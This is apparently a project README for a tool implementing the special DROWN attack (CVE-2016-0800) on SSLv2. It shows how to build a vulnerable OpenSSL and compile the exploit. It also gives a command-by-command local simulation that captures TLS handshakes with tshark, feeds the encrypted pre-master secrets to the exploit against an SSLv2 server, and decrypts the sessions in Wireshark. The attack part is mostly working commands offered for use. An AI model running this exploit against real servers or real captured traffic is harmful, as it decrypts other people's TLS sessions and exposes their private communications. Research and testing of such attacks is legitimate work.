# drown
Implementation of the special DROWN attack on SSL2

Note : this does not cover the general DROWN attack.


## Installation

First, we need a version of OpenSSL with SSLv2 enabled. Also, if we want to make some simulations, we need a vulnerable OpenSSL (<= 1.0.1l).
We will compile and install it on the folder /path/to/prefix :

    wget https://www.openssl.org/source/openssl-1.0.1l.tar.gz
    tar xzf openssl-1.0.1l.tar.gz
    cd openssl-1.0.1l
    ./config enable-ssl2 enable-weak-ciphers --openssldir=/path/to/prefix
    make && make install

Now let's compile the exploit :

    git clone https://github.com/Tim---/drown
    SSL_PREFIX=/path/to/prefix make

To decrypt an encrypted pre-master secret c, using the public key of the server at the address host:port, we will use the following command :

    ./drown host:port certfile c

## Passive attack

In this type of attack, we can see the traffic between a server and a client using TLS.
In this case, we can decrypt some TLS sessions if :
* the same server, or another server, allows SSLv2 connections with the same public key ;
* the TLS sessions uses RSA as a key exchange algorithm (no Diffie-Hellman) ;
* the server is vulnerable to CVE-2016-0800 ;
* there is a sufficient number of session.

## Simulation

To simulate this scenario, want to record some TLS handshakes between a client and a server.
We will use the old version of OpenSSL we have installed to create a server, and initiate a lot of sessions.
We will capture the handshakes with tshark.

    cd /path/to/prefix
    ./bin/openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 123
    ./bin/openssl s_server -cert cert.pem -key key.pem -accept 4433 -www
    tshark -i lo -w handshakes.cap
    for i in $(seq 1000) ; do (echo 'GET / HTTP/1.1\r\n'; sleep 0.1) | ./bin/openssl s_client -connect 127.0.0.1:4433 -cipher kRSA; done

We can now get the encrypted pre-master secrets for each session with :

    tshark -r handshakes.cap -d tcp.port==4433,ssl -T fields -e ssl.handshake.epms -Y ssl.handshake.epms | tr -d :

To decrypt these handshakes, we need an OpenSSL server accepting SSLv2 connections :

    ./bin/openssl s_server -cert cert.pem -key key.pem -accept 4434 -www -ssl2

We can now decrypt the encrypted pre-master secret : 

    tshark -r handshakes.cap -d tcp.port==4433,ssl -T fields -e ssl.handshake.epms -Y ssl.handshake.epms | tr -d : | ./drown localhost:4434 cert.pem > pms.txt

After some time and if we're lucky, we will have some results in pms.txt. You can use this file in Wireshark to decrypt the content of the TLS session (Protocol Preferences > SSL > (Pre)-Master-Secret log filename).

